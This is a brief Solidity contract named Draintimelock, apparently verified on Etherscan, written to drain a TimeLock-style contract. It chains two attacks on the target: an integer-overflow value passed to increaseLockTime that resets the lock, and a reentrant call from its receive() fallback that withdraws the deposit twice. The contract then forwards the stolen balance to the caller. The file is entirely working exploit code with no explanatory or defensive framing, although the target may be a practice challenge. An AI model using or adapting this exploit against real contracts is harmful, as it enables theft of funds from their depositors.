/**
 *Submitted for verification at Etherscan.io on 2022-04-20
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

interface ITimeLock {
  function deposit() external payable;
  function increaseLockTime(uint t) external;
  function withdraw() external;
}

contract Draintimelock {
  ITimeLock timelock;
  bool flag;

  constructor() public payable {}

  function play(ITimeLock tl) external payable {
      flag = true;
      timelock = tl;
      tl.deposit{value: msg.value}();
      tl.increaseLockTime(115792089237316195423570985008687907853269984665640564039457584007911479181696);
      tl.withdraw();

      payable(msg.sender).transfer(address(this).balance);
  }

  receive() external payable {
    if (flag) {
        flag = false;
        timelock.withdraw();
    }
  }
}